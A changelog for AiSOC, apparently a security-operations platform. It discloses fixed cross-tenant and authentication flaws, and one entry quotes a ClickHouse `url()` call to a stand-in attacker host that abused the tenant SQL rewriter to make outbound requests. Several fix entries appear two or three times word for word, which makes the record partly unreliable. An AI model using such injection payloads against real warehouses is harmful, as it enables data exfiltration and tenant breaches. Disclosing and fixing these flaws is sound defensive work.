# Changelog

All notable changes to AiSOC will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### BREAKING

- **Three MSSP response schemas describing fabricated data are removed:
  `MSSPKpiOverview`, `ManagedTenantRow`, `CrossTenantIncident`.** They were
  the shape of five hardcoded companies with invented alert counts, not the
  shape of anything the platform measured. `/mssp/overview`,
  `/mssp/tenants` and `/mssp/incidents` keep their paths and now return
  `PortfolioSummaryOut`, `PortfolioTenantOut` and `PortfolioAlertOut`,
  computed from real rows.

  What moved, and why it could not be preserved:

  - `health_score` / `avg_health_score` are **gone**, not nulled. It was an
    undefined composite with no formula anywhere in the tree; keeping the
    field would promise a measurement that does not exist. (`MetricsOut` on
    the separate `/mssp/metrics` route still carries a `health_score` and is
    unchanged by this release.)
  - `avg_mttr_minutes` → `mttr_minutes`, measured from cases a tenant
    actually closed in the trailing 30 days, and **null** when it closed
    none. The old value was the literal `23.4`. Present on both the per-tenant
    row and the portfolio summary, where it averages only over tenants that
    closed something rather than counting a null as a zero.
  - `sla_breach_count` and `sla_breaches` → `sla_breached_cases`, counted
    from `cases.sla_breached`.
  - `connectors_online` / `connectors_degraded` / `connector_status` →
    `total` / `healthy` / `stale` / `error`, derived from each connector's
    `health_status` and `last_sync`. Nested under a `connectors` object on
    the per-tenant row; flat `connectors_*` fields on the summary.
  - `tenant_id` is now a real tenant UUID rather than a string like
    `"t-acme"`.
  - `assignee` is gone from the incident rows. It named invented analysts;
    an alert's real owner is `case_id`, which is now returned instead.
  - New: `synthetic_alerts`, so seeded demo rows are counted apart from a
    tenant's real posture instead of inflating it.

  The routes also return `403` to a caller who belongs to no operator
  organisation, where they previously returned an empty list to anyone
  authenticated.

  Nothing in `apps/web` consumes these three routes; it calls
  `/mssp/children`, which is unchanged.

### Added

- **Tool attribution is now prevented at commit time and blocked in CI.** AiSOC
  does not attribute work to a development tool or AI assistant. An audit found
  the rule was being broken automatically: a `Co-authored-by:` trailer naming an
  editor appeared in 214 commits on `main`, and 280 of 732 pull request bodies
  carried a "Made with" or "Generated with" footer. Nothing in the repository
  caused it — no `commit.template`, no `core.hooksPath`, nothing in
  `.git/hooks/` — the editor appended it at commit time, and it survived
  `git commit --amend`.

  - `.githooks/commit-msg` strips the line before it reaches a commit. It is
    wired through `core.hooksPath`, so it is version-controlled and shared with
    every clone rather than living in an untracked `.git/hooks/`;
    `scripts/setup_hooks.sh` installs it and runs automatically as the `prepare`
    script on `pnpm install`. The hook rewrites and never rejects — a hook that
    can block is a hook that can halt someone's work on a bad pattern, so the
    blocking job belongs in CI where it is visible.
  - This is load-bearing rather than cosmetic because the repository
    squash-merges with `squash_merge_commit_message=COMMIT_MESSAGES`: GitHub
    composes the squash commit body from the branch commits, so a trailer on any
    branch commit is copied onto `main` at merge time.
  - `scripts/check_attribution.py` fails CI when attribution appears in a
    commit message, a changed file or the PR body. A human `Co-authored-by:`
    line is never flagged — a pattern only fires when the trailer names a known
    tool — and `dependabot[bot]` is allowlisted.
  - The gate runs on `push` to `main` as well as on `pull_request`. A PR-only
    check is one-directional: it inspects what contributors propose but never
    what actually lands, so anything introduced by the merge itself would pass
    it while the gate stayed green.
  - `--self-test` runs on every CI invocation and checks four directions against
    a shared fixture corpus: the gate detects every known-bad sample (so it
    cannot pass vacuously), flags no known-good sample (so it cannot pass
    direction one by flagging everything), and the hook strips exactly what the
    gate flags in both directions (so the two implementations cannot drift).
    Both read their patterns from the same `.githooks/attribution-patterns.txt`.
    The self-test earned its place immediately by catching a real hole in the
    patterns — `Built with GitHub Copilot` slipped through, because a vendor
    word sat between the verb and the tool name.

### Changed

- **A hosted deployment's hostname no longer appears in self-hosted docs as the
  reader's own URL.** Seven files under `apps/docs/` pointed at the managed
  instance: two `curl` examples told a self-hoster to push their SIEM data to
  somebody else's ingest endpoint, a sample address appeared in a console
  illustration, three white-paper links and a benchmark-scoreboard link sent
  open-source readers to the hosted console, and a JSON Schema `$id` claimed the
  hosted docs domain. These now use `example.com`, in-repo GitHub links, or the
  project's own documentation URL. Pages genuinely *about* the managed offering
  keep naming it, as does the docs build configuration.
- **The Slack bot no longer deep-links an unconfigured deployment to somebody
  else's console.** `AISOC_WEB_BASE_URL` defaulted to a hosted hostname, so a
  self-hoster who deployed the bot without setting it got case cards pointing at
  another instance. It now defaults to `http://localhost:3000`, matching the
  compose default it had silently disagreed with, and both documented defaults
  were corrected with it.

### Security

- **`/api/v1/identity-timeline` read every tenant's alerts.** Both routes bound
  an authenticated user and never used it: the SQL against `aisoc_alerts`
  carried no `tenant_id` predicate, so any authenticated caller could pull any
  tenant's alerts whose title or evidence matched a substring — and the
  substring is the search term, so the match is caller-controlled. Both routes
  are now scoped to the caller's tenant.

- **`/api/v1/playbooks` had no authentication at all.** The module declared no
  `Depends` of any kind across eight routes and there is no global auth
  middleware, so every route was reachable unauthenticated — including
  `POST /playbooks/{id}/run`, which executes a playbook against the estate.
  Each route now demands `playbooks:read`, `playbooks:write` or
  `playbooks:execute`; all three permissions already existed in
  `ROLE_PERMISSIONS` and had no reader. `:execute` stays distinct from
  `:write` so an analyst can run a governed playbook without editing one.

- The case-timeline linked-alert hydration in `cases.py` now binds a tenant as
  defence in depth. Reaching it already required a tenant-scoped case, so this
  was not a live read, but a poisoned `alert_ids` array would otherwise have
  surfaced another tenant's alert title.

- **Any authenticated user could disable detection rules inside any other
  tenant.** `_ensure_mssp_parent`, the guard on the MSSP write surface, had
  `pass` for a body. Four routes took a caller-supplied child tenant id and
  wrote it onto a row without checking whose child it was.

  The consequential one was `POST /api/v1/mssp/overrides`. An override with
  `action: "exclude"` is read back by `resolve_effective_rules`, filtered on
  `child_tenant_id == <the reader's tenant>`, and the rule is popped out of the
  set `POST /api/v1/rules/hunt` runs. So naming another tenant's id silently
  deleted a named detection from their hunts, and the victim's only symptom was
  a hunt that stopped matching. Reproduced against the previous commit: a
  tenant's effective ruleset went from one critical cloud rule to zero on an
  override written by an unrelated tenant.

  Closing those four routes alone would not have been enough, because
  `POST /api/v1/mssp/children/{id}/onboard` let anyone *become* the parent
  first — its only check was a `409` when the target already had a parent, so
  every standalone tenant on a deployment was adoptable by any authenticated
  user. Adoption now requires the child to have invited that specific parent by
  setting `settings.mssp_parent_invite` through `PATCH /api/v1/tenants/me/settings`,
  which only ever writes the caller's own row and is gated on `settings:write`.
  The invite is single-use. The child-scoped routes answer `404` rather than
  `403` for a tenant that is not yours, so they cannot enumerate tenant UUIDs.

- **`python-jose` is gone, and `ecdsa` with it.** `ecdsa` carried
  CVE-2024-23342 (Minerva timing attack on P-256) with no patched release —
  OSV records the affected range as introduced at 0 with no fixed event,
  because upstream states python-ecdsa offers no side-channel resistance and
  will not fix it. It was an unconditional requirement of `python-jose`, so
  the suppression was renewed rather than resolved. `services/api` now signs
  and verifies with `PyJWT`, which it already depended on for the OIDC and
  SAML paths; `python-jose`, `ecdsa` and `rsa` all leave the dependency tree.
  Six CI workflows installed `python-jose[cryptography]` and never installed
  `PyJWT`, and reached `cryptography` — a declared direct dependency of
  `services/api` — only through that extra; they now install both by name.

- **`image-size` moved to a patched release instead of staying suppressed.**
  Both advisories were held open on the reading that no fix existed. They
  record a vulnerable range of `<= 2.0.2`, and npm has published 2.0.3 and
  2.0.4; a null `first_patched_version` is not the same claim as no fix
  existing. A pnpm override pins `>=2.0.4 <3`, which
  `@docusaurus/mdx-loader`'s `^2.0.2` range accepts. This clears the only two
  high-severity advisories in the pnpm workspace.

- **The dependency suppression list is empty.** All 42 entries in
  `scripts/security_audit_ignores.txt` were re-verified against OSV and
  against the versions the lockfiles actually resolve. Every one was
  resolvable, and most of the justifications had stopped being true: nine
  starlette entries blamed a `fastapi<0.137` cap that exists in neither bot
  service, three cryptography entries blamed `<50`/`<49` caps that exist
  nowhere in the repository, and the langchain, weasyprint, anyio, aiohttp,
  h2, idna and pydantic-settings entries each named a version older than the
  one their lock resolves. The file now records what was measured, so the next
  review starts from evidence rather than from the previous reason string.

- **The pnpm and Go arms of the audit could report success without scanning.**
  A failed `govulncheck`, an unparseable `pnpm audit` response and a registry
  that never answered were all recorded as warnings, which exit 0 — so the job
  printed "0 findings" for ecosystems it had not read. All three now record a
  coverage gap, which `exit_code_for` already failed on for the Python arm.
  That property — an unscanned target fails the build — had no test; it does
  now.

### Fixed

- **The MSSP console showed six invented tenants and made no API call at all.**
  `MSSPDashboardView.tsx` declared `const TENANTS = [...]` — "Acme Financial",
  "GlobalRetail Corp", "MedSecure Health" and three more, with invented alert
  counts, MTTD/MTTR figures, risk scores, analyst headcounts and ARR — handed
  it to `useState`, and never fetched anything. Every operator on every
  deployment saw the same six rows, permanently, with no state in which they
  would not. The "Export Report" button raised a success toast and did nothing.

  It now reads `GET /api/v1/mssp/portfolio` and
  `GET /api/v1/mssp/portfolio/alerts` with no sample-data fallback and no SWR
  `fallbackData` (supplying it disables revalidation, so a placeholder becomes
  what the view permanently shows). Four states, each saying which it is:
  loading; a `403` explained as "you do not manage any tenants" rather than an
  outage; a portfolio failure surfaced with its message and a retry; and an
  empty portfolio that distinguishes "this organisation manages no tenants"
  from "you were granted none" using `portfolio_wide` and `scoped_tenants`,
  because those have different fixes. The alert feed has its own states so a
  failure there does not claim the portfolio is down. Export now writes a CSV
  of the rows on screen — a real action rather than a toast.

  **ARR, risk score and analyst allocation are gone, not sourced.** There is no
  revenue, composite-risk or analyst-allocation data anywhere in this product.
  A column of nulls would still imply the measurement exists.

- **The fabricated-data gate could not see either of the two worst cases.**
  `scripts/check_mock_data_gated.py` recognised only mock data that announces
  itself: all three of its patterns required a `MOCK_` / `DEMO_` name *and* an
  assignment through a state setter or SWR `fallbackData`, which models one
  situation — a view that fetches and substitutes a sample when the fetch
  fails. A dataset written inline under an ordinary name, in a component with
  no fetch at all, matched nothing; and with no fetch there was no real path
  for a fallback to fall back *from*, which is the worse defect, not the
  lesser one. The gate reported "All sample-data fallbacks are gated behind
  demo mode" while both fabricated tables shipped.

  A third check looks for what makes fabricated domain data harmful rather
  than for what an author happened to call it: a module-scope array of records
  that names an entity a customer would recognise — a company, a person, a
  host, an IP, an address — *and* attaches numbers to it. Numeric keys that
  describe how something is drawn are excluded, which is what keeps it quiet:
  93 module-scope object arrays in the console, 7 matched, and the 4 already
  behind `demoFallback()` were the mocks. It newly caught
  `MSSPDashboardView.tsx` and `TeamAnalyticsView.tsx`.

  The reviewed-exception list is checked in **both** directions: an entry that
  no longer matches anything fails the gate, so an exemption cannot outlive the
  code it excused and become cover for whatever is written next under that
  name. One entry, `MitreStrip.tsx` — a public landing-page illustration whose
  visible copy already tells the reader the tiles are illustrative.
  `tests/test_mock_data_gate.py` covers both properties, including that filter
  lists, graph stylesheets, decorative SVG coordinates and pricing copy stay
  unflagged; a gate that cries wolf on every configuration array gets deleted,
  which is worse than the gap.

- **`/analytics/team` ranked six invented analysts by invented accuracy.**
  "Sarah Chen, 47 cases closed, 96.2% accuracy, score 945" and five more, plus
  a highlights feed of things that never happened. Nothing in the platform
  measures per-analyst performance — no route, no table, no column — so the
  sample is confined to the hosted demo via `canUseDemoData()` and everyone
  else is told plainly that the measurement does not exist yet. The aggregate
  tiles read `—` rather than dividing by zero.

- **The OpenAPI gate's documented escape hatch did not exist.** The workflow
  header told a maintainer to "re-run with `--allow-breaking`" and
  `scripts/openapi_diff.py` claimed the flag was what "the release flow uses" —
  but the workflow triggered on `pull_request` only, with no dispatch, no input
  and no label check, and the diff step never passed the flag. `--allow-breaking`
  had **no caller anywhere in the tree**. A maintainer facing a correct,
  deliberate break had no action that worked, and the two statements describing
  the procedure were both false.

  The hatch is now a PR label, `breaking-change-approved`, chosen over a
  `workflow_dispatch` boolean because applying a label leaves an attributable
  record of who authorised the break and when on the PR timeline. The job reads
  that timeline and names the approver in its output. It re-runs on `labeled`
  and `unlabeled`, so the label is a live control rather than one that waits for
  the next push.

  Approval is not a skip, and the flag is no longer usable as a silent bypass:
  `--allow-breaking` now *requires* `--changelog` and `--changelog-base`, so it
  cannot be wired up without also wiring up the thing that records what was
  approved. The detector still runs, and the job summary lists every breaking
  change being permitted next to the CHANGELOG note that justified it. The
  approval is refused if there is no `### BREAKING` section under
  `## [Unreleased]`, or if that section is byte-identical to the base branch's —
  checked in both directions, because "a BREAKING section exists" alone would
  let the first note in a release cycle excuse every later break in that cycle.

  The version-bump half of the old promise was dropped rather than implemented:
  this repository accumulates under `[Unreleased]` and bumps `VERSION` at
  release-cut, so a per-PR version check would demand something no PR can
  correctly do. The comment now says what the control does.

  Thirteen new tests, all of which fail against the pre-change tree. Four are
  wiring assertions over the workflow YAML itself — that some step passes
  `--allow-breaking`, that the step passing it is guarded by the label and
  presents its evidence, that the unapproved path still blocks, and that
  `labeled` is in the trigger types. A unit-tested function with no caller is
  indistinguishable from a working feature until something asserts the call.

- **Two response verbs worked and could not be reached.** `ack_alert` and
  `suppress_alert` have had Splunk, Elastic and Defender arms since Phase 3.3
  and were wired into `EXECUTOR_REGISTRY` — and appeared in none of the three
  registries that make a verb dispatchable: the live-action adapters, the
  capability contracts, or the capability vocabulary. Governed dispatch
  answered `executor_not_found` for code that ran, which reads as a
  misconfigured integration rather than a capability nobody connected. This is
  the mirror image of a defect already fixed here in the other direction,
  where eleven capabilities had a contract and no executor at all — including
  `unisolate_host`, so the rollback for the most disruptive action in the
  product resolved to nothing.

  Both verbs now have six vendor adapters (one per vendor arm), a capability
  contract, an entry in the vocabulary on both sides of the mirror, and a
  verification probe. Each adapter pins `alert_vendor` so a tenant with two
  SIEMs configured does not have the target chosen by credential ordering; the
  pin is still checked against the credentials, so pinning a vendor the tenant
  has not configured simulates rather than claiming an arm that could not have
  run.

  `ack_alert` is LOW impact and automatic: it marks a finding in-progress and
  owned by AiSOC, removing nothing from anyone's view, and two analysts
  working the same notable is the cost of not doing it. `suppress_alert` is
  LOW impact and **analyst-gated**, because what makes the disposition
  writeback safe to automate is the mapping that refuses to close a confirmed
  true positive, and this verb has no such bound — it closes whatever it is
  pointed at, on the caller's say-so.

- **A one-directional gate would have missed all of it.** `check_action_contract.py`
  now compares the four registries a verb needs in **both** directions, and
  `test_capability_reachability.py` injects drift in each direction and asserts
  the gate names it. The dominant failure shape in this repository is a check
  that compares A against B and never B against A, so drift in the direction
  things actually change passes while the check prints OK — the graph-schema
  check reported OK with 17 node labels declared and 28 implemented.

  Running it found three more mismatches beyond the two above. `create_ticket`
  and `notify` were registered, contracted and dispatchable across four
  vendors while absent from `KNOWN_CAPABILITIES` and the connectors
  `Capability` enum, so the registry logged `capability_unknown` for them at
  every startup; both are now in the vocabulary. `chatops_verify` has an
  executor no adapter reaches, and three `ActionType` members
  (`capture_forensics`, `add_ioc_to_blocklist`, `run_playbook`) have no
  executor at all — the first of those is proposed by name by the
  investigation agent on the C2/exfiltration path, so the product recommends
  evidence acquisition it cannot perform. Those four are recorded in the
  gate's exemption lists with the reason each is open. Both lists are
  ratchets: an entry that gains an implementation and is not removed fails the
  build.

- **The disposition writeback now verifies itself against the vendor.** It
  shipped declaring no verification probe, which was honest — a declared probe
  that does not run is the defect the contract gate exists to catch — but the
  standing rule is that an unverifiable action is not an autonomous one, and
  this action is automatic. The probe re-reads the finding and compares its
  state against the plan re-derived from the same verdict through the same
  `plan_writeback` the executor used, rather than being told separately what
  to expect. Splunk ES reads back the `incident_review` collection (a new
  `SplunkClient.get_notable_event_state`) and confirms status `5` on a close,
  or status `1` *and* the owner AiSOC set on an escalation, since status alone
  cannot distinguish a notable an analyst had already picked up. QRadar
  confirms `CLOSED` through `get_offense`, whose docstring had claimed to be
  the writeback probe since it was written and had no caller.

  A QRadar **escalation** deliberately reports `unverified`: escalating leaves
  the offense `OPEN`, which is also its prior state, so confirming "still
  OPEN" would certify a write that never happened — the same shape as the
  isolation probe that returned `bool(device_id)` and would have certified an
  uncontained host. Elastic, Sentinel and Defender expose no read of a
  finding's state and report `unverified` too. `ack_alert` and
  `suppress_alert` are verified against the same read-back.

- **A dry run called the customer's production SIEM.** The live-action dry-run
  path works by stripping credentials so the executor falls through to
  simulation, and the strip list did not match what the client factory reads:
  the Splunk adapters stripped `splunk_host` / `splunk_token` / `splunk_index`
  while `_splunk_client` reads `splunk_url` *first* and also accepts basic
  auth. `splunk_url` is exactly what the credential resolver writes for a
  connector-configured tenant, so a "preview" built a real client and called
  Splunk. Elastic had the identical mismatch (`elastic_host` stripped,
  `elastic_url` read). The strip lists are now the factories' own exported key
  tuples, and a test re-derives each read set from the factory source so the
  two cannot drift again.

- **An `alert_vendor` pin was honoured without checking that vendor's
  credentials existed.** `_ack_vendor` returned the pinned vendor
  unconditionally. A dry run strips credentials, so the pin survived the strip,
  resolved to "splunk" with no client, and hit an `assert` — crashing an action
  that was meant to be a harmless preview. A pin naming a vendor the tenant had
  never configured reported a vendor arm that could not run. A pin is now
  checked against the credentials, and an unusable pin resolves to *nothing*
  rather than falling through to whichever other SIEM happens to be configured:
  "write this to Splunk" must not become "write this to Elastic".

- **`CreateNotableEventExecutor` raised `TypeError` on every live call.** It
  passed `title=` / `description=` / `fields=` to a client whose signature is
  `(rule_name, event_data, severity, owner, status)`. Invisible because
  simulation mode never constructs the client — the same defect class as the
  `max_results` / `max_count` drift fixed earlier on this module. Every SIEM
  executor-to-client call is now pinned by an autospec'd signature test, which
  a hand-written fake with `**kwargs` could never have caught.

- **The lake's tenant isolation could be switched off by resolving a
  dependency one major version higher.** `lake_sql.rewrite_for_tenant` is the
  only thing separating one tenant's events from another's in ClickHouse: it
  parses untrusted operator SQL with sqlglot, enforces the table allowlist
  against the parse tree, bans ClickHouse table functions, and injects the
  `tenant_id` predicate. sqlglot 27 moved the SELECT's FROM clause from
  `args["from"]` to `args["from_"]`. The table walk read the old key, got
  nothing, and took the branch written for `SELECT 1` — "no FROM, so no tenant
  data, nothing to do". Every single-table query then came back with no
  allowlist check, no table-function ban and no tenant predicate, reported as
  a successful rewrite.

  `services/api/pyproject.toml` declared `sqlglot >=23.0.0,<31.0.0` while the
  Dockerfile and every CI workflow declared `>=23,<27`, so this was reachable
  by installing the service exactly as declared, and CI could not see it
  because CI installed the narrow range. Verified on sqlglot 30.19.0 against
  the pre-fix rewriter: `SELECT user_name FROM aisoc.raw_events` returned
  unscoped, `SELECT * FROM system.tables` was accepted, and
  `url('https://attacker.example/x', JSONEachRow)` was accepted — the last of
  which makes the warehouse issue outbound HTTP with its own network identity.

  Three changes rather than one, because pinning alone would leave the trap
  armed for the next bump. The FROM clause now resolves by node type instead
  of by key name. `rewrite_for_tenant` ends with an audit that takes its own
  independent census of the statement's tables and raises the new
  `LakeSqlIsolationError` unless every one of them was scoped, the tenant
  survived into the rendered string, and every rendered SELECT that reads a
  lake table carries the tenant in its own WHERE — so a partially scoped
  UNION fails too. And all seven install paths now declare one identical
  range, enforced by `scripts/check_sqlglot_pin.py`, with
  `.github/workflows/lake-isolation.yml` running the rewriter suites against
  both the shipped range and the next major so a future bump fails loudly
  instead of quietly downgrading isolation.

- **The alerts list was empty on every deployment, under a row count that was
  real.** `AlertListResponse` returns the rows under `items`; the web client
  read `raw.alerts`, which is never present, so `Array.isArray(undefined)` was
  false and each page resolved to `[]` while `total` carried the true figure.
  The queue therefore rendered "1,247 alerts" above an empty table with no
  error to explain it, and an operator's most reasonable reading of that screen
  was that their estate was quiet. The client now reads `items`, still accepts
  the legacy `alerts` key the responder routes emit, and a test asserts the two
  halves of the contract against each other so they cannot drift apart again.

- **Two dashboards published fabricated security data as tenant state.**
  `DashboardView` and `SOCMetricsDashboard` both wrapped their SWR
  `fallbackData` in `demoFallback()`, which is `undefined` outside the hosted
  demo — and both then defeated that gate a few lines later with an
  unconditional `const resolved = isValid ? data : MOCK`. The mock was
  therefore exactly what rendered during first paint and after any API error,
  which for a self-hoster with an empty or unreachable backend is the whole
  session.

  What that put on screen as the reader's own numbers: a connector inventory
  they do not run (`CrowdStrike EDR`, 412 events), a MITRE tactic ranking, a
  24-hour alert-volume curve, MTTD 1.4h / MTTR 6.2h, and an LLM spend line of
  $76.65 naming three models they had never configured. Three "vs yesterday"
  trend deltas sat beside the real alert counts as literals — `/metrics/dashboard`
  publishes no period-over-period comparison, so there was nothing to derive
  them from.

  Every panel now renders one of three honest states: real figures, an empty
  state naming what would populate it, or an error state carrying the failure
  and a retry that re-issues the request. Sample data still populates the
  hosted demo, which is the only reason it exists.

- **The lake's tenant isolation could be switched off by resolving a
  dependency one major version higher.** `lake_sql.rewrite_for_tenant` is the
  only thing separating one tenant's events from another's in ClickHouse: it
  parses untrusted operator SQL with sqlglot, enforces the table allowlist
  against the parse tree, bans ClickHouse table functions, and injects the
  `tenant_id` predicate. sqlglot 27 moved the SELECT's FROM clause from
  `args["from"]` to `args["from_"]`. The table walk read the old key, got
  nothing, and took the branch written for `SELECT 1` — "no FROM, so no tenant
  data, nothing to do". Every single-table query then came back with no
  allowlist check, no table-function ban and no tenant predicate, reported as
  a successful rewrite.

  `services/api/pyproject.toml` declared `sqlglot >=23.0.0,<31.0.0` while the
  Dockerfile and every CI workflow declared `>=23,<27`, so this was reachable
  by installing the service exactly as declared, and CI could not see it
  because CI installed the narrow range. Verified on sqlglot 30.19.0 against
  the pre-fix rewriter: `SELECT user_name FROM aisoc.raw_events` returned
  unscoped, `SELECT * FROM system.tables` was accepted, and
  `url('https://attacker.example/x', JSONEachRow)` was accepted — the last of
  which makes the warehouse issue outbound HTTP with its own network identity.

  Three changes rather than one, because pinning alone would leave the trap
  armed for the next bump. The FROM clause now resolves by node type instead
  of by key name. `rewrite_for_tenant` ends with an audit that takes its own
  independent census of the statement's tables and raises the new
  `LakeSqlIsolationError` unless every one of them was scoped, the tenant
  survived into the rendered string, and every rendered SELECT that reads a
  lake table carries the tenant in its own WHERE — so a partially scoped
  UNION fails too. And all seven install paths now declare one identical
  range, enforced by `scripts/check_sqlglot_pin.py`, with
  `.github/workflows/lake-isolation.yml` running the rewriter suites against
  both the shipped range and the next major so a future bump fails loudly
  instead of quietly downgrading isolation.

- **Every entity chip in the Investigation Rail was a 404.**
  `alert_rail.py` built its pivots as `/attack-graph?entity=…` and there has
  never been an `attack-graph` route, so host, user, asset, IP and domain chips
  all failed before the query parameter mattered. The rail's own docstring
  described the working behaviour ("the same `?entity=` query the
  AttackGraphView already parses"), and `pivot.ts` states as fact that the rail
  emits `/graph?entity=…`; the code agreed with neither. Pivots now target
  `/graph`, which reads the parameter and selects the node.

  The existing test pinned all six strings under a docstring claiming the pin
  "prevents an accidental rename". It cannot — it compares the producer against
  a copy of itself, which is how a route that never existed stayed asserted.
  `services/api/tests/test_pivot_routes_resolve.py` derives the route table
  from `apps/web/src/app` and checks it against what `build_related_entities`
  actually returns, so the comparison now runs in the direction that drifts.

  The same test caught a second defect in the producer: values went into the
  URL unencoded, so an asset named `Finance & Legal #2` pivoted to
  `Finance & Legal` and looked like it had worked. Values are now encoded the
  way `pivot.ts` encodes them.

- **Six funnel metrics were published as zero whatever the database held.**
  `_funnel_window` merges `_triage_quality`'s output into the dict it returns,
  but the `FunnelMetrics(...)` call never named `triaged_alerts`,
  `abstentions`, `abstention_rate`, `ungrounded_demotions`,
  `mean_groundedness` or `scored_verdicts`, so all six fell back to their
  field defaults on every response. A published zero is a stronger claim than
  silence: it reads as "this tenant never abstained, and nothing was ever
  demoted for being ungrounded". The existing test asserted the six names were
  present in `model_fields`, which they were — declaring a field and forwarding
  it are different things. The replacement drives the endpoint and fails for
  any field the window computes and the response drops, including ones added
  later.

- **The Live Feed labelled an empty panel "Demo".** The seeded events were
  gated behind `canUseDemoData()` in an earlier pass but `statusToLabel` was
  not, so outside the hosted demo the panel rendered nothing at all under a
  "Demo" pill whose tooltip read "showing demo data" — asserting the presence
  of sample data that had just been correctly withheld. The pill now describes
  what is on screen (`Live`, `Connected`, `Connecting…`, `Reconnecting…`,
  `Offline`) and can only say `Demo` when seeded events are actually rendered,
  and the idle panel carries an empty state naming what would fill it.

- **The welcome banner quoted counts it had no source for and linked to a case
  most deployments do not have.** It advertised "26 vendors" against a registry
  of 84 and "25 named runbooks" with nothing holding either to the tree. The
  connector figure now comes from `CONNECTOR_COUNT`, which is generated from
  the connector registry and held to it by `scripts/generate_connector_count.py
  --check`; the playbook figure is gone rather than guessed, because no
  equivalent source exists. Its second call to action linked to
  `/cases/INC-RT-001`, which exists only after the demo seed has run, so on
  every other deployment the banner's own CTA was a dead link — that tip is now
  gated on demo mode, takes its href from `demoDeeplink()` and says on its face
  that it is sample data.

- **`SavedViewsBar` updated its parent while rendering.** The auto-apply of a
  default saved view ran in the render body and called `onApply`, which for
  every caller is a setState on the page component. React rejects that outright
  and makes no promise about processing the update, so the filters an analyst
  expected restored were not reliably applied. The comment described a ref-flag
  that did not exist; it was `useState` with no effect anywhere. The chip
  highlight is now derived rather than stored, and the one genuine side effect
  — handing the filters to the page — happens in an effect. The existing
  "exactly once" test could not catch this because its `onApply` was a bare
  spy that set no state; the new test uses a real parent.

- **The alerts list was empty on every deployment, under a row count that was
  real.** `AlertListResponse` returns the rows under `items`; the web client
  read `raw.alerts`, which is never present, so `Array.isArray(undefined)` was
  false and each page resolved to `[]` while `total` carried the true figure.
  The queue therefore rendered "1,247 alerts" above an empty table with no
  error to explain it, and an operator's most reasonable reading of that screen
  was that their estate was quiet. The client now reads `items`, still accepts
  the legacy `alerts` key the responder routes emit, and a test asserts the two
  halves of the contract against each other so they cannot drift apart again.

- **Two dashboards published fabricated security data as tenant state.**
  `DashboardView` and `SOCMetricsDashboard` both wrapped their SWR
  `fallbackData` in `demoFallback()`, which is `undefined` outside the hosted
  demo — and both then defeated that gate a few lines later with an
  unconditional `const resolved = isValid ? data : MOCK`. The mock was
  therefore exactly what rendered during first paint and after any API error,
  which for a self-hoster with an empty or unreachable backend is the whole
  session.

  What that put on screen as the reader's own numbers: a connector inventory
  they do not run (`CrowdStrike EDR`, 412 events), a MITRE tactic ranking, a
  24-hour alert-volume curve, MTTD 1.4h / MTTR 6.2h, and an LLM spend line of
  $76.65 naming three models they had never configured. Three "vs yesterday"
  trend deltas sat beside the real alert counts as literals — `/metrics/dashboard`
  publishes no period-over-period comparison, so there was nothing to derive
  them from.

  Every panel now renders one of three honest states: real figures, an empty
  state naming what would populate it, or an error state carrying the failure
  and a retry that re-issues the request. Sample data still populates the
  hosted demo, which is the only reason it exists.

- **The lake's tenant isolation could be switched off by resolving a
  dependency one major version higher.** `lake_sql.rewrite_for_tenant` is the
  only thing separating one tenant's events from another's in ClickHouse: it
  parses untrusted operator SQL with sqlglot, enforces the table allowlist
  against the parse tree, bans ClickHouse table functions, and injects the
  `tenant_id` predicate. sqlglot 27 moved the SELECT's FROM clause from
  `args["from"]` to `args["from_"]`. The table walk read the old key, got
  nothing, and took the branch written for `SELECT 1` — "no FROM, so no tenant
  data, nothing to do". Every single-table query then came back with no
  allowlist check, no table-function ban and no tenant predicate, reported as
  a successful rewrite.

  `services/api/pyproject.toml` declared `sqlglot >=23.0.0,<31.0.0` while the
  Dockerfile and every CI workflow declared `>=23,<27`, so this was reachable
  by installing the service exactly as declared, and CI could not see it
  because CI installed the narrow range. Verified on sqlglot 30.19.0 against
  the pre-fix rewriter: `SELECT user_name FROM aisoc.raw_events` returned
  unscoped, `SELECT * FROM system.tables` was accepted, and
  `url('https://attacker.example/x', JSONEachRow)` was accepted — the last of
  which makes the warehouse issue outbound HTTP with its own network identity.

  Three changes rather than one, because pinning alone would leave the trap
  armed for the next bump. The FROM clause now resolves by node type instead
  of by key name. `rewrite_for_tenant` ends with an audit that takes its own
  independent census of the statement's tables and raises the new
  `LakeSqlIsolationError` unless every one of them was scoped, the tenant
  survived into the rendered string, and every rendered SELECT that reads a
  lake table carries the tenant in its own WHERE — so a partially scoped
  UNION fails too. And all seven install paths now declare one identical
  range, enforced by `scripts/check_sqlglot_pin.py`, with
  `.github/workflows/lake-isolation.yml` running the rewriter suites against
  both the shipped range and the next major so a future bump fails loudly
  instead of quietly downgrading isolation.

- **Scheduled hunts ran against credentials that could not exist, so every one
  of them returned zero hits.** The event-warehouse drivers resolved their
  endpoint and secret from `settings.ES_URL` / `ES_API_KEY` / `SPLUNK_URL` /
  `SPLUNK_HMAC_TOKEN` / `CHRONICLE_PROJECT_ID`. None of those were declared
  fields on `Settings`; each was read through `getattr(settings, name, None)`,
  so the miss was silent, and `Settings` sets `extra="ignore"`, so an operator
  who followed the resulting "set them in environment variables" message and
  exported `ES_URL` got the same message back. The scheduler treats the
  resulting `HuntNotConfigured` as a soft skip, so the failure was invisible.

  Credentials now resolve from the tenant's own `connectors` row — the one the
  console wizard writes, encrypted by the credential vault — which is where
  `federated.py` and `case_fanout.py` already read theirs. The warehouse is
  per-tenant by construction as a result: a managed provider can point each
  customer at their own cluster, which resolving from process settings made
  impossible even in principle. `ES_URL` / `ES_API_KEY` are now declared
  fields and remain as a deployment-wide fallback for single-cluster installs.

- **Provider selection ignored which SIEM the tenant had connected.**
  `resolve_provider` returned the first driver whose `translated_query_key`
  appeared in the hunt, and the natural-language translator emits ES|QL, SPL
  *and* KQL for every question — so `esql` was always present and
  Elasticsearch was always chosen, including for tenants who run only Splunk.
  Selection is now driven by the tenant's enabled connectors first and the
  available translation second.

- **`POST /nl-query/execute` documented two request fields it ignored.**
  `es_url` and `es_api_key` were described as overrides and silently dropped.
  `es_url` now selects among the caller's own Elasticsearch connectors by
  host, matched against connectors they own and never used as an outbound
  target; `es_api_key` is refused with 400, because credentials belong in the
  vault-encrypted connector rather than in a request body.

### Added

- **Two-way SIEM integration: an AiSOC verdict is written back onto the
  finding that produced the alert.** The integration only ever ran inbound. A
